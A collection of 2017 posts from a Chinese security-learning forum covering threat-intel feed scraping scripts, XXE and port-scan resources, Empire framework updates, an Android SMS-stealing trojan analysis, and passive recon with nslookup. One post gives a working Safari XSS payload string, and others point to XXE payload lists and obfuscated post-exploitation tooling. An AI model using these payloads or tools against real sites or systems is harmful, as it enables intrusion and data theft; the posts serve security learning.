<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-05:

嗯。。。科普一下自动爬取开源情报
比如
[http://osint.bambenekconsulting.com/feeds/c2-domma...](http://osint.bambenekconsulting.com/feeds/c2-dommasterlist-high.txt)

这个源经常更新很多c2域名，那我们只需要写个简单的小脚本每小时自动化爬下来然后每天整合一下
以下是脚本示例
#!bin/bash
#获取当前系统时间精确到时
date=$(date +%Y%m%d%H)
#文件名变量
filename=baddomains_${date}.txt
#用wget把情报爬下来
wget 
[http://osint.bambenekconsulting.com/feeds/c2-domma...](http://osint.bambenekconsulting.com/feeds/c2-dommasterlist-high.txt)


#作个简单字符串处理后保存
cut c2-dommasterlist-high.txt -f 1,2 -d , | sed -e '/#/d' > $filename
rm c2-dommasterlist-high.txt

脚本2,每天把拿到的情报去除重复项整合一下

#!/bin/bash
#获取昨天的日期
date=$(date -d yesterday +%Y%m%d)
filename=IOC_${date}.txt
#把昨天所有文件排序整合
cat baddomains_${date}*|sort|uniq|sort -t , +1 -2 > $filename
rm baddomains_${date}*

最后把以上脚本加入到crontab里面定时运行就OK了



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好😄

<img src="https://file.xiaomiquan.com/c1/72/c172abf7cb79b6e84958c7e46d643c1c4e9dd14a106f35b3bcf1dd251c753a00.jpg" width="25px"/> __ohblackmagic__: 清晰明了，赞

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 有兴趣也可以看看这个（推荐PC浏览器打开）😄

[FireHOL IP Lists | IP Blacklists | IP Blocklists |...](http://iplists.firehol.org/)



更新脚本比较复杂，不过看懂之后再写类似的脚本就不在话下了： 

[firehol/update-ipsets at master · firehol/firehol ...](https://github.com/firehol/firehol/blob/master/sbin/update-ipsets)



<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__: 脚本可以直接套脚本😂，不过这个IP列表没有对应威胁信息，无从归类😅

<img src="https://file.xiaomiquan.com/d7/70/d770925d03a48166661a8101018a4f33a3ee1cf3922d704d4330cbdc5b28b58a.jpg" width="25px"/> __jiayu__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: IP库来源有介绍，有一部分是有针对性威胁信息的，比如某个家族Malwr的C2


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-05:

嗯，最近写了些脚本自动采开源情报，定时分享一些，大家可以添进各自的规则里


__分享文件:__
[IOC_20170904.txt](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 你应该顺便科普下😄

<img src="https://file.xiaomiquan.com/37/43/374310d6c0d10abd44b2dbd539c133fde6ac46f958196b2b642747858dc0af82.jpg" width="25px"/> __大宇__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: +1

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 其实这个很简单呀，把情报爬下来处理一下字符串就可以输出了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: 处理好说，关键是应用场景、应用背景什么的

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我一般是添到回溯设备里，有相关报警就可以回溯流量，记录源IP、A地址，然后再挖源IP的流量找出出样本，A地址又可以扔进去回溯，挖所有通信过的客户端记录一下，上报处理


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-09-05:

这是一篇关于端口扫描的科普，对于原理讲的挺细了推荐新手同学好好读读，去实践一下
[谈谈端口探测的经验与原理 - FreeBuf.COM | 关注黑客与极客](http://www.freebuf.com/articles/network/146087.html)





...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 确实是好文，虽然一些小细节不严谨

<img src="https://file.xiaomiquan.com/ff/f2/fff2d2a9cf8d31dde8b21cde5a1c3c387080fc4711e6039d58a4b571c9811449.jpg" width="25px"/> __别说话吻我头像__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 能具体讲讲哪些细节吗😂


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-04:


__#资源#__

 XXE 及 XXE OOB 攻击清单

XXE 全称：XML External Entity，XML 扩展实体。扩展了，攻击面就来了。

OOB 全称：Out of Band，带外数据，就是把数据传出去的方式，应用场景主要在无回显的场景，也就是所谓的盲打场景。

这里有一份清单，还不错，作为玩到这类攻击时的参考：


[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)



这里漏洞如何挖掘呢，自动化其实也不难，那些 Payloads 发出去，想办法接收判断就好。如果你在渗透时，发现有 XML 格式的数据传输（或 base64 等可逆加密后的），那么就可以顺手一试是否有 XXE 漏洞。

总会存在惊喜的。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 链接在墙外，自己想办法


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-09-01:


__#姿势#__

 
分享一个最新的Safari XSS供大家把玩把玩，权当抛砖引玉
<script>location.href;'javascript:alert%281%29'</script>

<img src="https://images.xiaomiquan.com/FvEIJiOesyg3CW4IHSS8gbuIxwQK?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PHR5k-Xs0LWwC3VBmRDJhOzVnxs=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 把;当成=

这类trick都可以通过简单的fuzzing找到。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 大家可以拿起 Safari 浏览器，访问测试：

[http://xssor.io/s/safari.html](http://xssor.io/s/safari.html)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: iPhone上的Safari也可以哦

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: 哈哈，赞

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 通过 cos 这个例子发现了 Safari 重定向以后接下来的代码都不执行，而 Chrome 和JavaScript 伪协议似乎有 py 交易，重定向以后还从下一行执行到结束。😅


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-31:


__#工具#__

  Empire 更新了 v2.1

Empire is a PowerShell and Python post-exploitation agent.

这款 PowerShell 与 Python 攻击利用神器，想必越来越多渗透师在用。时隔3个多月，更新了不少内容。具体的可以看这：


[Empire/changelog at master · EmpireProject/Empire ...](https://github.com/EmpireProject/Empire/blob/master/changelog)



我最感兴趣的更新内容是下面这条：

-Add Obfuscated Empire #597 @cobbr

增加了混淆 Empire，这个我们第一时间就跟进研究并运用了，Empire 也真的整合了，不过我还没测试整合得如何。

基于 Python 构建的 Empire 开源生态非常有前途（远不仅是 Empire 本身），由于这种生态在 GitHub 这种高浓度黑客氛围下发展着，渗透师的距离也越来越小了。和我交流过的人会明白此时的竞争壁垒在哪，加油吧。

如果你听都没听说过这个，或没实战运用过，自己查资料吧。



...

<img src="https://file.xiaomiquan.com/83/d3/83d3d0975bd42c3e77d5fbb6ea8d422c784c42b012dfce8ab80621485a80e069.jpg" width="25px"/> __ 阿虚__: 😉

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 弦哥，问一下是否有最新的windows search的攻击代码？例如msf中rb文件

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 没

<img src="https://file.xiaomiquan.com/e4/ca/e4ca0340ac566f302dcda0afe835affed902e62dda2344fce0b7f9ac7cde2f21.jpg" width="25px"/> __safecat__: 第一次生成加密脚本的时候非常吃cpu。


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-08-30:


__#资源#__

  web安全学习中文资料
在微博，"蚁工厂"工厂上，看到一个不错的web安全学习中文资料，看了下，收集的挺不错的。搞web安全的同学遍历一下吧。
Web-Security-Learning，关于web安全的资料收集。中文资料。
包括SQL注入、前端安全XSS、CSRF、SSRF、XXE、JSONP注入，还有各种序列化漏洞、资料收集、渗透测试等等等等。

[GitHub - CHYbeta/Web-Security-Learning: Web-Securi...](https://github.com/CHYbeta/Web-Security-Learning)



<img src="https://images.xiaomiquan.com/Fu2m7AzyLbHKx8cw72815O-JRwQv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:zNWisirBB1u1vm6pXQaEeMk8b1g=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FiFhtu0qZ6MRaakyWGrVi5BnZJyI?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:qPh_ZE_ce9kcjA2Zt5GGQ3W0SGs=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FhnmTcjzQTbiRXWcz5CRKr8YLL_0?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:DtM3j_vNEsVSDzlEjBeEr-rqEqM=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FiiztpuGB-SRmMdFFa_SYzJgYx9o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:5PqPDRedj3XMiK1-NJuSXnoVp84=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 从来不评论，但是这个太好了，感谢，希望多发类似的

<img src="https://file.xiaomiquan.com/91/f8/91f81e70221f48b37d1cb3e0b292055cc67cf73ab42f9412d9f773911efdcc9f.jpg" width="25px"/> __AAAACD__: 打不开

<img src="https://file.xiaomiquan.com/9e/a0/9ea0c3d113079d89e8aa7eb1636f1866f9e7fb4430d1bfd503116db4f11f2a7e.jpg" width="25px"/> __吴奇__: 感谢分享


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-29:

> 匿名用户 提问：
弦哥，请教啊，对工业控制系统感觉还是有很多区别于其他系统的内容，比如工控系统漏洞挖掘更多基于协议和设备通信组态的，而且感觉工控系统比较封闭，怎么能够突破边界，边界都有单向设备隔离。


看看 plcscan.org，以前作者在乌云分享了不少案例，如果想入门了解下工控安全，可以看我曾经公布的一篇演讲《网络空间工控设备的发现与入侵》，下面这可以找到：


[GitHub - evilcos/papers: my open papers](https://github.com/evilcos/papers)



很多时候不一定要直接去面对这个单向设备。



...

<img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 你说的是Z0ne吧

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/41/b3/41b36482e50df589c1aab96bf02cc26f84715aecfb4ab94cff73436a248938a7.jpg" width="25px"/> __剑思庭__: 嗯


...

---

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ on 2017-08-29:

有一天我一个做程序员的朋友收到一条短信，内容是“看看我们之前的回忆影集 链接：链接：
[http://118.184.51.172](http://118.184.51.172)

”，看到这个内容，顿时感觉是一条诱惑短信，一打开网站，为一个 apk 文件下载地址。文件引起了我的兴趣，下载后进行了编译分析，发现主要是获取用户短信、电话簿等信息，通过短信或邮箱的方式发送给控制者，同时启动了多个服务，用于长期监听用户的短信，并可以通过指定手机号码下发指令到受害者手机上进行长期的远程遥控。

从 apk 用来接收邮件的邮箱来看，2017-08月份查到有 2 万多人已安装了，而这些大部份是发生在 2017-08-18号。

感觉可以做的事情就很多了，现在的银行等好多互联网服务依赖于短信通知，如快捷支持、验证码、注册、找回密码等等，从这个 apk 用于接收邮件的邮箱可以看出，有多条敏感短信信息。

源码分析过程中，主要涉及了 android 的反编译、android 开发基础知识已及 java 基础知识。


__分享文件:__
[一款 android 木马分析.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 可以对指定受害者进行长期控制 这个有意思。

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 是的，通过短信发送命令给手机，手机负责执行。

<img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 想问下如何查到的接收邮箱用户安装量？

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/58/e0/58e0e911c15f99cfb8994d9f484be21c5966b3c50e4241e5e2617599f157c67c.jpg" width="25px"/> __5u9ar__: 反编译后，密码就在代码里面

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 这不就是Android源码吗？入门水平

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: android 基础知识


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-08-28:


__#姿势#__

 
__#代码审计#__

  
php的配置文件很重要，咱们先从搞懂配置文件开始吧。:)


__分享文件:__
[代码审计之php配置文件.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 想要请教一个问题，xdebug在只有get参数或者只有Post参数的时候能够工作，但是两者都有的时候断点就无效了，表哥有没有遇到过这种问题？

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 没遇到过..


...

---

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ on 2017-08-28:


__#基础#__

 「FanQiang」 - 年轻人的第一把梯子

这次我们「试着」说说徒手「翻x墙」这个技能。关于这次分享的主题，涉及敏感话题，大家懂得。

本着「让年轻人打造第一把属于自己的梯子」的信念，担着被和谐的风险，有了这次的分享。

「翻x墙」可以说是一个必备技能了，但是新手入坑一般都是从「免费」开始的。

其实只要你想找，正确的姿势你能很容易找到。当然，不是说那些「free v.p.n」。

这次我们说说自己动手「0 成本使用 AWS 搭建 SS 服务器」这个标准姿势。

链接：
[「从入门到入狱系列」 - AWS SS 0成本徒手翻墙 | 灰色地带](http://ev1l.cn/2017/08/26/AWS_SS_Hello_World/)


文章比较偏向「有灵性的小白」。

最后搬运一下 COS 分享过的一组符号表情
┓┏┓┏┓┃
┛┗┛┗┛┃＼○／
┓┏┓┏┓┃   /     STOP
┛┗┛┗┛┃ノ)
┓┏┓┏┓┃         USE
┛┗┛┗┛┃ 
┓┏┓┏┓┃         FREE
┛┗┛┗┛┃ 
┓┏┓┏┓┃         V.P.N
┃┃┃┃┃┃



...

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 文章里竟然开车。。。🙊

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 🐒

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 赞！写的很详细，aws很易用，上手之后可以去买个性价比高的vps.

<img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 哈哈哈难得看到一个看的懂的:)

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/94/84/948404f2db7578409ae23a5bfbec08002ed6714f9d48fd7301f0abf11b140d29.jpg" width="25px"/> __有水有生命__: 😁

<img src="https://file.xiaomiquan.com/98/a8/98a8f6ba0277c6bee3afb5ef53546472d64d4db3858dbb48c6d0c91df02bc63a.jpg" width="25px"/> __bin__: 测试成功，谢谢大佬了！

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/98/a8/98a8f6ba0277c6bee3afb5ef53546472d64d4db3858dbb48c6d0c91df02bc63a.jpg" width="25px"/> __bin__: 注意身体😑

<img src="https://file.xiaomiquan.com/25/54/2554db8a586cc8faa9975308b54f5988af68e0b341cb88b77e90e4c05ebeab88.jpg" width="25px"/> __Immortals__: 可以尝试kcptun加速ss，1080p不是问题

<img src="https://file.xiaomiquan.com/59/51/5951d4e58f300c77c694d102186da5cca79e17dc6ba43fc529c330cd75005c2c.jpg" width="25px"/> __请添加备注__: 阿里云貌似也可以，就是有些小贵

<img src="https://file.xiaomiquan.com/fc/6a/fc6a8b97a0702c8ca06abad9cb5ca9e275d54577b4c41b70fcd9d314db5b680d.jpg" width="25px"/> __三思之旅__: Google Cloud免费一年，油管4K轻松飞起😏

<img src="https://file.xiaomiquan.com/73/46/7346088fcbd428bef2055102b2eb708048b824a0e3a18a369d5c40ef3265e14c.jpg" width="25px"/> __TomW__: aws免费的现在好像不是每月15G了，是450小时。昨天帮朋友搭梯子发现的

<img src="https://file.xiaomiquan.com/73/4f/734f2c7364f4ef86e936145ef88229d700ac299eb89414ded45da3c1923caa9e.jpg" width="25px"/> __苏少‮蛋脸小的你下一了亲并‭__: 其实我觉得搬瓦工更简单一点

<img src="https://file.xiaomiquan.com/f0/bf/f0bfbda89e3585e2553dc9f03f3bdab2b563215c2cfdbb66931262abb622cf61.jpeg" width="25px"/> __黑色的眼睛__: 没看到亚马逊哪里有写：每月15G流量的限制啊？

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__ replies to <img src="https://file.xiaomiquan.com/f0/bf/f0bfbda89e3585e2553dc9f03f3bdab2b563215c2cfdbb66931262abb622cf61.jpeg" width="25px"/> __黑色的眼睛__: 
[https://aws.amazon.com/cn/free/faqs/](https://aws.amazon.com/cn/free/faqs/)



<img src="https://file.xiaomiquan.com/f0/bf/f0bfbda89e3585e2553dc9f03f3bdab2b563215c2cfdbb66931262abb622cf61.jpeg" width="25px"/> __黑色的眼睛__: 没看到亚马逊哪里有写：每月15G流量的限制啊？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-28:


__#基础#__

  JavaScript 入门经典读书笔记

分享来自@Hi  

分享得很认真，30来页笔记，不容易，如果你需要发展前端黑，那么 JavaScript 是必备黑魔法，如果你想成为全栈黑客，JavaScript 也必须掌握。

脚踏实地，一步一步，成长才能稳！


__分享文件:__
[JavaScript 入门经典5th_Ch01-10.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 学习前端，有个好方式，找着百度ife前端学院的教程来，新手的话去看他们开设的第一期，是在github上的，比较初级

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 学jquery还用学js吗？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 当然啊，jQuery只是方便的js框架罢了，你不熟悉js怎么行

<img src="https://file.xiaomiquan.com/88/ba/88baf27d18a55ca81cb25b0279ab02127bac65f1d2a9cdfbc724c0cf7512f7e9.jpg" width="25px"/> __In&eRes7ing__: 目前正在看，很基础，但是也很考验人。基础不牢地动山摇啊

<img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: ife的报名不是已经截止了吗？怎么弄呢？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e1/13/e11323b87fbd14d11c8ed453e58d5e203cff855222009760643443f997682362.jpg" width="25px"/> __你慢慢的我先走__: 不用报名，跟着它们的节奏来学，看第一期和第二期


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-28:


__#基础#__

  面向基础篇之信息收集

分享来自@yudan  

#概要：渗透测试的第一步为信息收集。信息收集分为两个方面，主动信息收集和被动信息收集，这次我们先讲被动信息收集
被动信息收集要注意一下几点：

1、信息是公开渠道可获得的信息，例如网络上的信息，街边的小广告
2、收集信息时不与系统产生直接交互（例如不对主机进行大量探测，不进行端口扫描）
3、尽量避免留下一切痕迹

可收集的信息内容有：

ip地址段
域名信息
邮件地址
文档图片
公司地址
公司组织架构
联系电话
人员姓名/职务
目标系统的技术架构
公开的商业信息

用途有：

信息描述目标
社会工程学等

接下来介绍一款获得ip地址的工具：nslookup(域名查询工具)。

在用nslookup之前，我们首先需要知道域名有哪些:

域名记录:

A（Adress）用来指定主机名（或域名）的对应的ip地址记录
C name：通常称别名指向，可以将注册的不同域名统统转到一个主域名上，CNAME别名记录与A记录不同的是可以是一个域名的描述而不一定是ip地址	
NS：（Name Server）是域名服务器记录，用来指定域名应该由哪个DNS服务器来进行解析
MX：邮件交换记录，他指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器
ptr（ip地址反向解析）：邮件交换记录
TXT记录：一般为某个主机名或域名设置的说明
URL:网址转发
FQDN：完全限定域名，与域名不同（eg:www.sina.com就是一个完全限定域名，只是域名的其中一种）

#dns查询方式：递归查询（相关资料可以自己查，太啰嗦不赘述）

接下来是nslookup的使用方法：

1、我们可以直接在命令行上输入nslookup，进入命令行提示符进行操作
	通过 server +ip地址（中间一定要有一个空格）选择你要的本地dns服务器
	通过 set type=a/ns/ptr/any(代表所有记录)
接下来看图，图中是百度的示例。


2、同样的，我们可以将第一种方法上的所有参数用一条命令写出来
	nslookup -type=a baidu.com 114.114.114.114(指定你想用的本地dns服务器)
P.S.
	#一个域名可以解析成多个主机记录和多个cname，对应多个ip地址，对一个ip地址进行ptr查询的时候不一定返回一个相同的域名
	#使用不同的服务器解析相同的域名会有不同的ip地址，因为智能dns服务器会尽量将流量限定在本地网络，当进行域名查询的时候会返回最近的域名服务器的地址

<img src="https://images.xiaomiquan.com/FoXOKm9XO81g-qTG-L7YB3R4juZi?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:VdpLft4Myzk6c2JKw6hUfBYmvak=" width="50%" height="50%" align="middle"/>
